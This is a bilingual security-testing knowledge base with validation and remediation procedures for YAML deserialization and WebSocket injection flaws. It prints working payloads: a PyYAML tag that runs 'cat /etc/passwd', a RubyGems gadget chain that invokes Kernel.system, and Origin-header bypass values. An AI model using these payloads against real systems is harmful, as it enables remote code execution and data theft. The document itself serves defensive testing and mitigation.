title.en: Parse after replacing with the marker helper

description.zh: 不运行原始 cat，使用一次性令牌和短超时在隔离 Loader 中提交一次。
description.en: Do not run the original cat command; submit once to the isolated Loader with a one-time token and short timeout.

attackChain.payload: !!python/object/apply:subprocess.check_output [['cat','/etc/passwd']]

title.zh: 关联构造器、子进程与输出
title.en: Correlate constructor, child process, and output

description.zh: 匹配 YAML 构造器日志、父子 PID、帮助程序哈希和随机输出，排除错误文本。
description.en: Match YAML constructor logs, parent-child PIDs, helper hash, and random output while excluding error text.

title.zh: 切换 SafeLoader 并清理
title.en: Switch to Safe Loader and clean up

description.zh: 修复后重放普通 YAML 与 object/apply，确认前者正常、后者在构造前拒绝，再删除帮助程序。
description.en: After remediation replay ordinary YAML and object/apply, preserve the former and reject the latter before construction, then delete the helper.

overview.zh: PyYAML 的 Python 专用标签可在允许的 Loader 下构造对象或调用可调用对象。`safe_load` 应拒绝该标签，而历史 `Loader`/`UnsafeLoader` 行为和版本差异必须从实际调用确认。
overview.en: Py YAML's Python-specific tags can construct objects or invoke callables under a permissive Loader. safe_load should reject this tag, while historical Loader or Unsafe Loader behavior and version differences must be confirmed from the actual call.

vulnerability.zh: 若应用用不安全 Loader 解析不可信 YAML，object/apply 可把数据边界升级为 Python 可调用对象执行。标签被识别、错误中出现 subprocess 或 YAML 语法通过并不等于函数被调用。
vulnerability.en: If an application parses untrusted YAML with an unsafe Loader, object/apply can turn a data boundary into Python callable execution. Tag recognition, subprocess in an error, or valid YAML syntax does not mean the function was invoked.

exploitation.zh: 先用普通 mapping 与 safe_load 建立无子进程基线，再将原参数改为只打印随机值的 marker-helper，并对目标 Loader 解析一次。阳性要求请求、Loader、Python 父进程、帮助程序子进程和输出令牌关联；构造器错误或源码回显是阴性。
exploitation.en: Establish a no-child baseline with an ordinary mapping and safe_load, replace the original arguments with a marker-helper that only prints a random value, and parse once with the target Loader. A positive correlates request, Loader, Python parent, helper child, and output token; constructor errors and source reflection are negative.

mitigation.zh: 对不可信输入使用 safe_load/SafeLoader 或更简单的数据格式，绑定明确 schema，禁止 Python 专用标签并升级受支持 PyYAML。运行身份还应限制子进程、文件和网络权限。
mitigation.en: Use safe_load or Safe Loader, or a simpler data format, for untrusted input; bind an explicit schema, reject Python-specific tags, and upgrade supported Py YAML. Also restrict child-process, file, and network permissions for the runtime identity.

name.zh: RubyGems YAML Gadget 对象图
name.en: Ruby Gems YAML Gadget Object Graph

description.zh: 构造 Gem、TarReader、Net::BufferedIO 与 Net::WriteAdapter 的 YAML 对象图，使 method_id 指向 Kernel.system，验证 Ruby 不安全对象加载。
description.en: Builds a YAML object graph across Gem, Tar Reader, Net::Buffered IO, and Net::Write Adapter with method_id targeting Kernel.system to test unsafe Ruby object loading.

prerequisites.zh: 已确认“RubyGems YAML Gadget 对象图”的真实 loader、输入格式、依赖版本和允许类型，并满足：应用对不可信 YAML 使用允许任意类的 load/unsafe_load，目标 Ruby/RubyGems 版本包含兼容 gadget 类并触发后续对象方法。
prerequisites.en: The real loader, format, dependency versions, and allowed types for Ruby Gems YAML Gadget Object Graph are known, and the application uses class-permissive load or unsafe_load on untrusted YAML, the Ruby and Ruby Gems versions contain compatible gadget classes, and later object methods trigger.

prerequisites.zh: 可在无外网的一次性进程加载正常对象，并观察Ruby/Psych/RubyGems 版本、实例化类图、触发调用栈和替代 Kernel 方法的固定无害标记能够关联。
prerequisites.en: A disposable no-network process can load a normal object and observe Ruby, Psych, and Ruby Gems versions, instantiated class graph, trigger stack, and a fixed harmless substitute for the Kernel method correlate.

title.zh: Ruby 反序列化
title.en: Validation step 1 for Ruby Gems YAML Gadget Object Graph

execution.command:
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: id
       method_id: :resolve

description.zh: Ruby 反序列化包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Ruby Gems YAML Gadget Object Graph validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性必须证明输入到达 loader、对象或函数被构造、触发路径执行，并取得Ruby/Psych/RubyGems 版本、实例化类图、触发调用栈和替代 Kernel 方法的固定无害标记能够关联。流头、Base64、类名、YAML 标签、解析异常或依赖中存在 gadget 均是假阳性，不能证明“Ruby YAML/Psych 是否实例化 RubyGems 与 Net 类并在对象交互中调用 Net::WriteAdapter 指定的方法”。
analysis.en: A positive proves loader reachability, object or function construction, trigger execution, and Ruby, Psych, and Ruby Gems versions, instantiated class graph, trigger stack, and a fixed harmless substitute for the Kernel method correlate. Headers, Base64, class names, YAML tags, parser errors, or a gadget merely present in dependencies are false positives and do not prove whether Ruby YAML or Psych instantiates Ruby Gems and Net classes and invokes the method selected by Net::Write Adapter during object interaction.

opsecTips.zh: RubyGems YAML Gadget 对象图停止条件：将危险动作替换为一次性临时标记；若 loader 尝试联网、加载远程类、访问真实文件或启动非标记进程，立即杀死隔离进程。 本条重点观察“Ruby YAML/Psych 是否实例化 RubyGems 与 Net 类并在对象交互中调用 Net::WriteAdapter 指定的方法”。
opsecTips.en: Ruby Gems YAML Gadget Object Graph stop condition: Replace dangerous effects with a one-time marker; kill the isolated process on network access, remote class loading, real-file access, or a non-marker process. The entry-specific focus is whether Ruby YAML or Psych instantiates Ruby Gems and Net classes and invokes the method selected by Net::Write Adapter during object interaction.

opsecTips.zh: RubyGems YAML Gadget 对象图清理条件：每个对象使用新进程；测试后销毁进程、临时目录和缓存，轮换测试会话材料，并确认类、原型或全局状态无残留。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Ruby Gems YAML Gadget Object Graph cleanup condition: Use a fresh process per object; destroy processes, temporary directories, and caches, rotate test session material, and verify no class, prototype, or global state remains. Recheck that no triggerable state remains for this technique.

title.zh: 确认“RubyGems YAML Gadget 对象图”加载 API
title.en: Confirm the Ruby Gems YAML Gadget Object Graph loader

description.zh: 定位真实反序列化函数、输入来源、允许类型与依赖版本，核对前提“应用对不可信 YAML 使用允许任意类的 load/unsafe_load，目标 Ruby/RubyGems 版本包含兼容 gadget 类并触发后续对象方法”。
description.en: Locate the real deserializer, source, allowed types, and dependency versions, confirming that the application uses class-permissive load or unsafe_load on untrusted YAML, the Ruby and Ruby Gems versions contain compatible gadget classes, and later object methods trigger.

title.zh: 建立“Ruby YAML Gadget 链”正常对象基线
title.en: Establish the Ruby YAML Gadget Chain object baseline

description.zh: 加载固定数据对象并记录类型、生命周期与副作用，再以“Ruby/Psych/RubyGems 版本、实例化类图、触发调用栈和替代 Kernel 方法的固定无害标记能够关联”作为异常对象证据。
description.en: Load a fixed data object and record types, lifecycle, and side effects, accepting Ruby, Psych, and Ruby Gems versions, instantiated class graph, trigger stack, and a fixed harmless substitute for the Kernel method correlate as abnormal-object evidence.

title.zh: 隔离验证“RubyGems YAML Gadget 对象图”对象
title.en: Validate the Ruby Gems YAML Gadget Object Graph object in isolation

description.zh: 测试步骤为：在一次性 Ruby 进程用 Psych.safe_load 验证拒绝，再通过受控允许类和替代无害方法检查对象图，不执行原 system id。保持原字节不变用于引用，实际运行时将危险动作替换为一次性标记。
description.en: verify rejection with Psych.safe_load in a disposable Ruby process, then inspect the object graph with controlled permitted classes and a harmless substitute method without executing system id. Preserve original bytes for reference while replacing dangerous runtime effects with one-time markers.

attackChain.payload:
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: id
       method_id: :resolve

title.zh: 迁移到安全数据格式
title.en: Migrate to a safe data format

description.zh: 实施“对不可信 YAML 使用 safe_load 且不给 gadget 类许可，升级 Ruby/RubyGems，移除对象图反序列化并使历史缓存和会话失效”并重放合法对象、未许可类型和历史令牌，确认数据兼容且对象代码不再加载。
description.en: Apply use safe_load for untrusted YAML without permitting gadget classes, update Ruby and Ruby Gems, remove object-graph deserialization, and invalidate historical caches and sessions, replay valid objects, unapproved types, and legacy tokens, and confirm data compatibility without loading object code.

overview.zh: RubyGems YAML Gadget 对象图检查Ruby YAML/Psych 是否实例化 RubyGems 与 Net 类并在对象交互中调用 Net::WriteAdapter 指定的方法。成立前提为：应用对不可信 YAML 使用允许任意类的 load/unsafe_load，目标 Ruby/RubyGems 版本包含兼容 gadget 类并触发后续对象方法。反序列化风险必须通过Ruby/Psych/RubyGems 版本、实例化类图、触发调用栈和替代 Kernel 方法的固定无害标记能够关联进行确认；仅识别到流头、类名或标签，不足以证明对象图已被加载或产生副作用。
overview.en: Ruby Gems YAML Gadget Object Graph checks whether Ruby YAML or Psych instantiates Ruby Gems and Net classes and invokes the method selected by Net::Write Adapter during object interaction. It applies when the application uses class-permissive load or unsafe_load on untrusted YAML, the Ruby and Ruby Gems versions contain compatible gadget classes, and later object methods trigger. Deserialization risk requires Ruby, Psych, and Ruby Gems versions, instantiated class graph, trigger stack, and a fixed harmless substitute for the Kernel method correlate; a stream header, class name, or tag alone does not prove object loading or side effects.

vulnerability.zh: 根因是应用对不可信 YAML 使用允许任意类的 load/unsafe_load，目标 Ruby/RubyGems 版本包含兼容 gadget 类并触发后续对象方法，不可信数据因此可能触发“Ruby YAML/Psych 是否实例化 RubyGems 与 Net 类并在对象交互中调用 Net::WriteAdapter 指定的方法”。真实影响由加载 API、允许类型、依赖版本、对象生命周期和服务权限共同决定，必须区分格式识别、对象实例化、gadget 触发与最终副作用四个阶段。
vulnerability.en: The root cause is the application uses class-permissive load or unsafe_load on untrusted YAML, the Ruby and Ruby Gems versions contain compatible gadget classes, and later object methods trigger, allowing whether Ruby YAML or Psych instantiates Ruby Gems and Net classes and invokes the method selected by Net::Write Adapter during object interaction. Impact depends on the loader API, allowed types, dependency versions, object lifecycle, and service privileges, so format recognition, object construction, gadget triggering, and final side effects must remain separate.

exploitation.zh: 在一次性 Ruby 进程用 Psych.safe_load 验证拒绝，再通过受控允许类和替代无害方法检查对象图，不执行原 system id。在一次性 worker 中先验证正常对象基线，再将危险动作替换为固定临时标记；逐个格式或类加载并保存原始字节、解析日志和进程状态，不读取真实秘密、不访问外部网络。
exploitation.en: verify rejection with Psych.safe_load in a disposable Ruby process, then inspect the object graph with controlled permitted classes and a harmless substitute method without executing system id. Establish a normal-object baseline in a disposable worker, replace dangerous behavior with a fixed temporary marker, and load one format or class at a time while preserving bytes, parser logs, and process state without real secrets or external network access.

mitigation.zh: 对不可信 YAML 使用 safe_load 且不给 gadget 类许可，升级 Ruby/RubyGems，移除对象图反序列化并使历史缓存和会话失效。完成迁移后同时重放合法数据对象、类型越界对象和历史令牌，确认业务数据仍可读取，而语言对象、函数源码和未许可类均被稳定拒绝。
mitigation.en: use safe_load for untrusted YAML without permitting gadget classes, update Ruby and Ruby Gems, remove object-graph deserialization, and invalidate historical caches and sessions. After migration, replay valid data objects, out-of-schema types, and historical tokens to preserve business data while reliably rejecting language objects, function source, and unapproved classes.

name.zh: WebSocket 消息 DOM XSS 探针

description.zh: 在 type=message 与 action=sendMessage 两种 JSON 信封中放置 HTML 事件处理器，验证 WebSocket 消息是否进入不安全 DOM sink。
description.en: Places HTML event-handler strings in type=message and action=send Message JSON envelopes to test whether Web Socket content reaches an unsafe DOM sink.

prerequisites.zh: 已确认应用接受其中一种 JSON 信封，并能定位消息从 WebSocket 处理器到 DOM 渲染 API 的数据流。
prerequisites.en: Confirm that the application accepts one JSON envelope and trace data from the Web Socket handler to the DOM rendering API.

prerequisites.zh: 测试浏览器使用隔离账号与 CSP/控制台日志，执行标记只设置本地布尔值，不调用外部网络。
prerequisites.en: Use an isolated account with CSP and console logging, and make the execution marker set only a local Boolean without external network calls.

title.zh: WebSocket消息注入
title.en: Validation step 1 for Web Socket Message DOM-XSS Probes

description.zh: WebSocket消息注入包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Web Socket Message DOM-XSS Probes validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 两组字段名只是到达 sink 的不同业务信封；是否 XSS 取决于最终 HTML 解析，而不是 WebSocket 帧被接受。`alert(1)` 字样出现在聊天记录、服务器 JSON 或日志中是假阳性；必须看到浏览器执行并排除扩展注入。
analysis.en: The two field families are business envelopes to the same class of sink; XSS depends on final HTML parsing, not acceptance of a Web Socket frame. `alert (1)` appearing in chat history, server JSON, or logs is false positive; browser execution must be observed after excluding extensions.

opsecTips.zh: 首个本地布尔标记执行后停止，不测试 Cookie 读取、外部 fetch、持久消息批量传播或其他用户账号。
opsecTips.en: Stop after the first local Boolean marker executes; do not test cookie reads, external fetches, bulk persistent propagation, or other users.

opsecTips.zh: 删除测试消息和存储记录，清理浏览器缓存/service worker，关闭套接字并确认没有重连队列继续回放载荷。
opsecTips.en: Delete test messages and stored records, clear browser cache and service workers, close the socket, and verify no reconnect queue replays the payload.

title.zh: 确认WebSocket 消息到 DOM sink前置条件
title.en: Confirm Web Socket Message-to-DOM Sink prerequisites

description.zh: 20 行覆盖两个消息 schema 与多种 HTML 事件上下文，目标是 DOM/存储型 XSS，不是 WebSocket 协议本身的漏洞。 记录正常行为、组件版本、安全头、消息 schema 及相关日志。
description.en: The 20 lines cover two message schemas and several HTML event contexts, targeting DOM or stored XSS rather than a flaw in the Web Socket protocol itself. Record normal behavior, component versions, security headers, message schema, and relevant logs.

title.zh: 执行受控WebSocket 消息到 DOM sink对照
title.en: Run a controlled Web Socket Message-to-DOM Sink comparison

description.zh: 先发送纯文本标记确认字段映射，再选择一个与实际 sink 匹配的无网络事件载荷，并与转义文本对照。 一次只改变一个浏览器能力、消息字段或协议边界，并使用无害标记。
description.en: Send a plaintext marker to map the field, then choose one networkless event payload matching the actual sink and compare it with escaped text. Change one browser capability, message field, or protocol boundary at a time and use a harmless marker.

title.zh: 核对WebSocket 消息到 DOM sink阳性边界
title.en: Verify Web Socket Message-to-DOM Sink positive boundaries

description.zh: 阳性要求目标浏览器在消息渲染后执行本地标记，且 DevTools 证明来源为该 WebSocket 数据；JSON 回显或消息 ACK 不足。 同时排除回显、客户端自执行、通用错误和手工客户端伪造能力。
description.en: Positive evidence requires the target browser to execute the local marker after rendering, with Dev Tools tracing it to the Web Socket data; JSON reflection or a message acknowledgment is insufficient. Also exclude reflection, client self-execution, generic errors, and capabilities introduced only by a manual client.

title.zh: 修复并回归WebSocket 消息到 DOM sink
title.en: Remediate and regress Web Socket Message-to-DOM Sink

description.zh: 对消息 schema 做严格验证，默认使用 textContent，富文本通过维护的消毒器和 CSP 处理，并在存储与回放路径一致编码。 重放正常、阳性和阴性样例并完成测试数据清理。
description.en: Validate the message schema strictly, default to text Content, sanitize allowed rich text with a maintained library and CSP, and encode consistently during storage and replay. Replay normal, positive, and negative cases and complete test-data cleanup.

overview.zh: WebSocket 消息 DOM XSS 探针聚焦20 行覆盖两个消息 schema 与多种 HTML 事件上下文，目标是 DOM/存储型 XSS，不是 WebSocket 协议本身的漏洞。 审校时必须先确认浏览器/协议版本、执行主体和受控测试对象，并保留正常基线。
overview.en: Web Socket Message DOM-XSS Probes focuses on this boundary: The 20 lines cover two message schemas and several HTML event contexts, targeting DOM or stored XSS rather than a flaw in the Web Socket protocol itself. Confirm browser or protocol version, execution principal, and controlled test objects, and retain a normal baseline.

vulnerability.zh: 服务端或客户端将消息内容作为 HTML 写入 innerHTML 等 sink，未按 HTML 上下文编码或消毒。 风险必须落到实际浏览上下文、消息 sink、认证主体或后端资源，不能从字符串外观推断。
vulnerability.en: The server or client writes message content into an HTML sink such as inner HTML without context-aware encoding or sanitization. Risk must be tied to the actual browsing context, message sink, authenticated principal, or backend resource rather than inferred from string appearance.

exploitation.zh: 先发送纯文本标记确认字段映射，再选择一个与实际 sink 匹配的无网络事件载荷，并与转义文本对照。 阳性要求目标浏览器在消息渲染后执行本地标记，且 DevTools 证明来源为该 WebSocket 数据；JSON 回显或消息 ACK 不足。 关联浏览器 DevTools、握手/消息日志和后端审计，形成明确阳性与阴性对照。
exploitation.en: Send a plaintext marker to map the field, then choose one networkless event payload matching the actual sink and compare it with escaped text. Positive evidence requires the target browser to execute the local marker after rendering, with Dev Tools tracing it to the Web Socket data; JSON reflection or a message acknowledgment is insufficient. Correlate browser Dev Tools, handshake or message logs, and backend audit to establish explicit positive and negative controls.

mitigation.zh: 对消息 schema 做严格验证，默认使用 textContent，富文本通过维护的消毒器和 CSP 处理，并在存储与回放路径一致编码。 修复后重放相同对照，合法浏览器/WebSocket 功能应保留，越权能力或解析差异应消失。
mitigation.en: Validate the message schema strictly, default to text Content, sanitize allowed rich text with a maintained library and CSP, and encode consistently during storage and replay. Replay the same controls after remediation; valid browser or Web Socket behavior should remain while unauthorized capability or parsing differences disappear.

name.zh: WebSocket 消息到 OS 命令注入

description.zh: 在两种 WebSocket JSON 信封的内容字段中放置 Shell 分隔符与命令，验证后端是否把消息拼入操作系统命令。
description.en: Places shell separators and commands in two Web Socket JSON envelope fields to test whether the backend concatenates message content into an operating-system command.

prerequisites.zh: 已确认消息由服务器处理而非仅客户端渲染，并能观察 WebSocket 请求到后端子进程的父子关系。
prerequisites.en: Confirm that the server processes the message rather than only rendering it client-side, and observe parentage from the Web Socket request to backend child processes.

prerequisites.zh: 将原始 id/whoami/cat/ls 替换为只输出唯一令牌的无害命令，测试账号无文件和网络高权限。
prerequisites.en: Replace source id, whoami, cat, and ls commands with a harmless unique-token command, and use an account without privileged file or network access.

title.zh: WebSocket命令注入
title.en: Validation step 1 for Web Socket Message-to-OS Command Injection

description.zh: WebSocket命令注入包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Web Socket Message-to-OS Command Injection validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 该条的危险边界位于 WebSocket 消息消费者到 OS Shell，而非浏览器。每个原始命令都可能读取主机信息或文件，验证时不得直接运行；只有进程树与唯一标记可确认 RCE，消息 ACK、断连或过滤器告警均不能。
analysis.en: The dangerous boundary is between the Web Socket consumer and an OS shell, not the browser. Every source command could expose host or file data and must not be run for validation; only process ancestry and a unique marker confirm RCE, while acknowledgments, disconnects, or filter alerts do not.

opsecTips.zh: 首次生成受控标记子进程后停止，不继续执行 whoami、读取 `/flag`、列目录或建立反向连接。
opsecTips.en: Stop after the first controlled marker child process and do not continue with whoami, `/flag` reads, directory listing, or reverse connections.

opsecTips.zh: 终止测试 worker/子进程，删除标记和消息记录，关闭 WebSocket 并确认自动重连不会再次发送命令。
opsecTips.en: Terminate test workers and child processes, delete markers and message records, close the Web Socket, and verify automatic reconnect does not resend commands.

title.zh: 确认WebSocket 后端命令 sink前置条件
title.en: Confirm Web Socket Backend Command Sink prerequisites

description.zh: 24 行按 type/message 与 action/sendMessage 信封覆盖 `|`、`;`、`||`、`&&`，属于后端命令注入而不是 XSS。 记录正常行为、组件版本、安全头、消息 schema 及相关日志。
description.en: The 24 lines cover `|`, `;`, `||`, and `&&` across type/message and action/send Message envelopes and target backend command injection rather than XSS. Record normal behavior, component versions, security headers, message schema, and relevant logs.

title.zh: 执行受控WebSocket 后端命令 sink对照
title.en: Run a controlled Web Socket Backend Command Sink comparison

description.zh: 用普通文本和同闭合的无害分隔符标记形成对照，一次只测试一个信封与分隔符并关联进程审计。 一次只改变一个浏览器能力、消息字段或协议边界，并使用无害标记。
description.en: Use plaintext and a harmless separator marker with identical closure as controls, testing one envelope and separator at a time with process-audit correlation. Change one browser capability, message field, or protocol boundary at a time and use a harmless marker.

title.zh: 核对WebSocket 后端命令 sink阳性边界
title.en: Verify Web Socket Backend Command Sink positive boundaries

description.zh: 阳性是 WebSocket 请求派生第二个标记进程；服务器回显字符串、消息发送成功、客户端控制台执行或后端返回通用错误都是假阳性。 同时排除回显、客户端自执行、通用错误和手工客户端伪造能力。
description.en: Positive evidence is a second marker process derived from the Web Socket request; server reflection, successful sending, client-console execution, or a generic backend error is false positive. Also exclude reflection, client self-execution, generic errors, and capabilities introduced only by a manual client.

title.zh: 修复并回归WebSocket 后端命令 sink
title.en: Remediate and regress Web Socket Backend Command Sink

description.zh: 使用固定程序与 argv，不将消息送入 Shell；对 schema、类型和枚举动作严格允许列表，并限制 worker 子进程权限。 重放正常、阳性和阴性样例并完成测试数据清理。
description.en: Use a fixed executable and argv without a shell, strictly allowlist schema, types, and actions, and restrict worker child-process privileges. Replay normal, positive, and negative cases and complete test-data cleanup.

overview.zh: WebSocket 消息到 OS 命令注入聚焦24 行按 type/message 与 action/sendMessage 信封覆盖 `|`、`;`、`||`、`&&`，属于后端命令注入而不是 XSS。 审校时必须先确认浏览器/协议版本、执行主体和受控测试对象，并保留正常基线。
overview.en: Web Socket Message-to-OS Command Injection focuses on this boundary: The 24 lines cover `|`, `;`, `||`, and `&&` across type/message and action/send Message envelopes and target backend command injection rather than XSS. Confirm browser or protocol version, execution principal, and controlled test objects, and retain a normal baseline.

vulnerability.zh: WebSocket 消息内容被拼入 Shell 字符串或 shell=true 子进程，分隔符因此改变后端命令结构。 风险必须落到实际浏览上下文、消息 sink、认证主体或后端资源，不能从字符串外观推断。
vulnerability.en: Web Socket message content is concatenated into a shell string or shell-enabled child process, allowing separators to alter backend command structure. Risk must be tied to the actual browsing context, message sink, authenticated principal, or backend resource rather than inferred from string appearance.

exploitation.zh: 用普通文本和同闭合的无害分隔符标记形成对照，一次只测试一个信封与分隔符并关联进程审计。 阳性是 WebSocket 请求派生第二个标记进程；服务器回显字符串、消息发送成功、客户端控制台执行或后端返回通用错误都是假阳性。 关联浏览器 DevTools、握手/消息日志和后端审计，形成明确阳性与阴性对照。
exploitation.en: Use plaintext and a harmless separator marker with identical closure as controls, testing one envelope and separator at a time with process-audit correlation. Positive evidence is a second marker process derived from the Web Socket request; server reflection, successful sending, client-console execution, or a generic backend error is false positive. Correlate browser Dev Tools, handshake or message logs, and backend audit to establish explicit positive and negative controls.

mitigation.zh: 使用固定程序与 argv，不将消息送入 Shell；对 schema、类型和枚举动作严格允许列表，并限制 worker 子进程权限。 修复后重放相同对照，合法浏览器/WebSocket 功能应保留，越权能力或解析差异应消失。
mitigation.en: Use a fixed executable and argv without a shell, strictly allowlist schema, types, and actions, and restrict worker child-process privileges. Replay the same controls after remediation; valid browser or Web Socket behavior should remain while unauthorized capability or parsing differences disappear.

name.zh: WebSocket 消息 SQL 注入

description.zh: 在 type/message 与 action/sendMessage 信封中测试布尔、UNION 和时间条件，验证消息字段是否拼入数据库查询。
description.en: 在 type/message 与 action/send Message 信封中测试布尔、UNION 和时间条件，验证消息字段是否拼入数据库查询。

prerequisites.zh: 已确认 WebSocket 消息触发服务器数据库访问，并能关联消息 ID、最终参数化/拼接查询与数据库日志。
prerequisites.en: 已确认 Web Socket 消息触发服务器数据库访问，并能关联消息 ID、最终参数化/拼接查询与数据库日志。

prerequisites.zh: 使用隔离测试表和固定记录，时间探针延时缩短且有正常/恒假统计对照。
prerequisites.en: Use an isolated test table with fixed rows and short timing probes with normal and false statistical controls.

title.zh: WebSocket SQL注入
title.en: Validation step 1 for Web Socket Message SQL injection

description.zh: WebSocket SQL注入包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Web Socket Message SQL injection validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: type 与 action 信封只是到达查询 sink 的两种路由。只有恒真/恒假结果差异、列结构标记或可重复时间信号与最终 SQL 一致才是阳性；数据库返回语法错误、聊天内容包含引号或网关阻断都可能是假阳性。
analysis.en: The type and action envelopes are only routes to the query sink. Positive evidence requires true or false result differences, a reflected column marker, or repeatable timing aligned with final SQL; database syntax errors, quotes in chat content, or gateway blocking can all be false positives.

opsecTips.zh: 获得一个固定测试记录或短延时证据后停止，不读取用户表、系统目录或扩大时间/请求次数。
opsecTips.en: Stop after one fixed test-row or short-delay proof and do not read user tables or catalogs or increase timing and request volume.

opsecTips.zh: 删除测试消息与数据库标记行，结束连接，清理慢查询/审计中的敏感文本并确认无重试。
opsecTips.en: Delete test messages and marker rows, close the connection, sanitize sensitive text from slow-query or audit logs, and verify no retries remain.

title.zh: 确认WebSocket 数据库查询 sink前置条件
title.en: Confirm Web Socket Database Query Sink prerequisites

description.zh: 16 行覆盖两个信封中的布尔、UNION 列数与 MySQL 时间条件，真实类别是 SQL 注入。 记录正常行为、组件版本、安全头、消息 schema 及相关日志。
description.en: The 16 lines cover Boolean, UNION column counts, and MySQL timing conditions in two envelopes and belong to SQL injection. Record normal behavior, component versions, security headers, message schema, and relevant logs.

title.zh: 执行受控WebSocket 数据库查询 sink对照
title.en: Run a controlled Web Socket Database Query Sink comparison

description.zh: 先用普通文本和真假条件比较固定记录，再按已识别 DBMS 选择一个 UNION 或短时间探针，避免混用方言。 一次只改变一个浏览器能力、消息字段或协议边界，并使用无害标记。
description.en: Compare plaintext and true or false predicates against fixed rows, then choose one UNION or short timing probe for the identified DBMS without mixing dialects. Change one browser capability, message field, or protocol boundary at a time and use a harmless marker.

title.zh: 核对WebSocket 数据库查询 sink阳性边界
title.en: Verify Web Socket Database Query Sink positive boundaries

description.zh: 查询结果、数据库审计或统计延时必须与条件对应；消息 ACK、连接关闭、SQL 字样回显或单次慢响应不构成注入。 同时排除回显、客户端自执行、通用错误和手工客户端伪造能力。
description.en: Query results, database audit, or statistical timing must track the condition; an acknowledgment, disconnect, reflected SQL text, or one slow response is insufficient. Also exclude reflection, client self-execution, generic errors, and capabilities introduced only by a manual client.

title.zh: 修复并回归WebSocket 数据库查询 sink
title.en: Remediate and regress Web Socket Database Query Sink

description.zh: 对消息 schema 做类型验证并使用预编译参数，动态标识符映射允许列表，限制数据库账户并统一错误。 重放正常、阳性和阴性样例并完成测试数据清理。
description.en: Validate message types and use prepared parameters, map dynamic identifiers to allowlists, restrict the database account, and normalize errors. Replay normal, positive, and negative cases and complete test-data cleanup.

overview.zh: WebSocket 消息 SQL 注入聚焦16 行覆盖两个信封中的布尔、UNION 列数与 MySQL 时间条件，真实类别是 SQL 注入。 审校时必须先确认浏览器/协议版本、执行主体和受控测试对象，并保留正常基线。
overview.en: Web Socket Message SQL injection focuses on this boundary: The 16 lines cover Boolean, UNION column counts, and MySQL timing conditions in two envelopes and belong to SQL injection. Confirm browser or protocol version, execution principal, and controlled test objects, and retain a normal baseline.

vulnerability.zh: 消息字段未经类型约束与参数绑定就拼入 SQL，WebSocket 传输层不会自动提供数据库安全。 风险必须落到实际浏览上下文、消息 sink、认证主体或后端资源，不能从字符串外观推断。
vulnerability.en: A message field is concatenated into SQL without type constraints or parameter binding; Web Socket transport provides no database safety. Risk must be tied to the actual browsing context, message sink, authenticated principal, or backend resource rather than inferred from string appearance.

exploitation.zh: 先用普通文本和真假条件比较固定记录，再按已识别 DBMS 选择一个 UNION 或短时间探针，避免混用方言。 查询结果、数据库审计或统计延时必须与条件对应；消息 ACK、连接关闭、SQL 字样回显或单次慢响应不构成注入。 关联浏览器 DevTools、握手/消息日志和后端审计，形成明确阳性与阴性对照。
exploitation.en: Compare plaintext and true or false predicates against fixed rows, then choose one UNION or short timing probe for the identified DBMS without mixing dialects. Query results, database audit, or statistical timing must track the condition; an acknowledgment, disconnect, reflected SQL text, or one slow response is insufficient. Correlate browser Dev Tools, handshake or message logs, and backend audit to establish explicit positive and negative controls.

mitigation.zh: 对消息 schema 做类型验证并使用预编译参数，动态标识符映射允许列表，限制数据库账户并统一错误。 修复后重放相同对照，合法浏览器/WebSocket 功能应保留，越权能力或解析差异应消失。
mitigation.en: Validate message types and use prepared parameters, map dynamic identifiers to allowlists, restrict the database account, and normalize errors. Replay the same controls after remediation; valid browser or Web Socket behavior should remain while unauthorized capability or parsing differences disappear.

name.zh: 跨站 WebSocket 劫持的 Origin 校验
name.en: Origin Validation for Cross-Site Web Socket Hijacking

description.zh: 测试 WebSocket 握手是否严格校验浏览器 Origin，并确认跨站页面能否借自动携带的会话凭据建立有权限连接。
description.en: Tests strict Origin validation during a Web Socket handshake and whether a cross-site page can establish an authorized connection using automatically attached session credentials.

prerequisites.zh: 目标 WebSocket 使用 Cookie 或浏览器自动携带的凭据，测试账号与跨站测试源均受控。
prerequisites.en: The target Web Socket uses cookies or other browser-attached credentials, and both the test account and cross-site origin are controlled.

prerequisites.zh: 可记录实际浏览器发送的 Origin、握手状态、会话主体和一项无副作用授权动作。
prerequisites.en: Record the browser-generated Origin, handshake status, session principal, and one side-effect-free authorized action.

title.zh: WS跨站劫持 (CSWSH) - Origin绕过
title.en: Validation step 1 for Origin Validation for Cross-Site Web Socket Hijacking

execution.command:
Origin: null
Origin: https://target.com.evil.com
Origin: https://evil.com%09target.com
Origin: https://evil.com%00target.com
Origin: https://evil.com%0d%0atarget.com
Origin: https://evil.com.target.com
Origin: https://target.com:443
Origin: https://target.com:8080
Origin: https://target.com:8443
Origin: https://target.com/
Origin: https://target.com%2f
Origin: https://target.com%252f
Origin: https://target.com%23evil.com
Origin: https://target.com#evil.com
Origin: https://target.com\evil.com
Origin: https://target.com%5cevil.com
Origin: http://target.com
Origin: ws://target.com
Origin: wss://target.com
Origin:

